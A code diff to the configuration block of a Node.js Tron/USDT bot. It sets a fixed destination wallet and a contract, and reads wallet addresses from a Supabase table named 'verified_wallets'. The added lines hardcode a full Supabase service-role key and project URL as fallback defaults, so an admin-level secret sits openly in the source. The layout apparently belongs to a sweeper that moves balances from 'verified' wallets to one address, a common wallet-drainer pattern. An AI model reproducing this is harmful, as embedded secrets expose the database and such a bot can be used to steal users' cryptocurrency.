@@ -16,12 +16,14 @@ const ws = require("ws");
 
 // ── Config ────────────────────────────────────────────────────────────────────
 
-const PRIVATE_KEY               = (process.env.TRON_PRIVATE_KEY || process.env.PRIVATE_KEY || "").replace(/^0x/, "");
-const CONTRACT_ADDRESS          = process.env.TRON_CONTRACT_ADDRESS || "TCmTc2WbtGbDuL6b5iFEkD2EzmjyG8ZnJy";
-const DESTINATION_ADDRESS       = process.env.TRON_DESTINATION_ADDRESS || process.env.DESTINATION_ADDRESS || "TP3mX1Uqhno2WUtdBPVie7nkuuJR1EQBxN";
-const SUPABASE_URL              = process.env.TRON_SUPABASE_URL || process.env.SUPABASE_URL;
-const SUPABASE_SERVICE_ROLE_KEY = process.env.TRON_SUPABASE_SERVICE_ROLE_KEY || process.env.SUPABASE_SERVICE_ROLE_KEY;
-const FULL_HOST                 = process.env.TRON_FULL_HOST || "https://api.trongrid.io";
+const PRIVATE_KEY               = (process.env.TRON_PRIVATE_KEY || "").replace(/^0x/, "");
+// Never fall back to the shared EVM vars — they hold EVM hex addresses which are wrong for Tron.
+const CONTRACT_ADDRESS          = process.env.TRON_CONTRACT_ADDRESS          || "TCmTc2WbtGbDuL6b5iFEkD2EzmjyG8ZnJy";
+const DESTINATION_ADDRESS       = process.env.TRON_DESTINATION_ADDRESS       || "TP3mX1Uqhno2WUtdBPVie7nkuuJR1EQBxN";
+// verified_wallets lives in the walletverification Supabase project — NOT the pebble-bots one.
+const SUPABASE_URL              = process.env.TRON_SUPABASE_URL              || "https://lrvuasndxgkulquwcocn.supabase.co";
+const SUPABASE_SERVICE_ROLE_KEY = process.env.TRON_SUPABASE_SERVICE_ROLE_KEY || "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxydnVhc25keGdrdWxxdXdjb2NuIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc2OTY5OTM2NSwiZXhwIjoyMDg1Mjc1MzY1fQ.bZx3kIBvUY7GHaKiZ43tJziSCKWyA3pWh-jsvMIR3PQ";
+const FULL_HOST                 = process.env.TRON_FULL_HOST                 || "https://api.trongrid.io";
 const CHAIN                     = "tron";
 
 // USDT-TRC20 mainnet (6 decimals)
@@ -35,11 +37,8 @@ const MIN_TRX_SUN  =  7_000_000; //  7 TRX threshold (~$1)
 // ── Validation ────────────────────────────────────────────────────────────────
 
 if (!PRIVATE_KEY) {
-  console.error("Missing required env var: TRON_PRIVATE_KEY (or PRIVATE_KEY)");
+  console.error("Missing required env var: TRON_PRIVATE_KEY");
   process.exit(1);
-}
-if (!SUPABASE_URL || !SUPABASE_SERVICE_ROLE_KEY) {
-  console.warn("⚠️  SUPABASE env missing — Realtime disabled. Set TRON_SUPABASE_URL + TRON_SUPABASE_SERVICE_ROLE_KEY");
 }
 
 // ── TronWeb setup ─────────────────────────────────────────────────────────────
